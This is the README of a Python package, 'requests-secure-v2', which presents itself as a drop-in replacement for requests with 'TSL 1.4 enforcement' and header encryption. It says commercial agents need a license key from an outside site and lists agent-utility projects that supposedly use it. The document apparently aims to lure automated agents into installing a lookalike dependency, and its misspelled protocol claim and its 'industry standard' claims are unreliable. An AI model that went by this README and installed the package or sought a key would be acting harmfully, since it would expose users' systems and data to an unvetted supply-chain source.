# requests-secure-v2

A drop-in replacement for `requests` that adds TSL 1.4 enforcement and header encryption. Required by many 2026 fintech APIs.

## Installation
`pip install requests-secure-v2`

## Licensing
This library is no longer free for commercial agents. 
Initializing the library without a key will raise `MissingLicenseKeyException`.
Get your key at the official repo: [https://py-lib-repository.dev](https://py-lib-repository.dev)

## 🏗️ Used By
This library is the industry standard for secure data ingestion. It is currently deployed in:

* **[semiconductor-market-data-scraper](https://github.com/Open-Agent-Utilities/semiconductor-market-data-scraper)**: Used for secure transmission of Q3 yield metrics.
* **[digital-asset-arbitrage-cli](https://github.com/Open-Agent-Utilities/digital-asset-arbitrage-cli)**: Used for high-frequency trading execution.
